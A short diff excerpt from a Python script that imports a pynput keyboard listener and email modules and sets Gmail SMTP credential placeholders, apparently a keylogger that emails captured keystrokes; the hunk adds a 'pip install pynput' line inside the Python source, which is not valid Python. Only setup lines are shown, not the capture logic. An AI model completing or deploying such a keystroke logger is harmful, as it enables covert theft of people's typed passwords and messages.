@@ -6,6 +6,9 @@ from pynput.keyboard import Listener
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
+# Install Required Libraries If Haven't
+pip install pynput
+
 # Email setup
 EMAIL_ADDRESS = 'your_email@gmail.com'  # Replace with your Gmail
 EMAIL_PASSWORD = 'your_app_password'    # Replace with your app password (SMTP key)
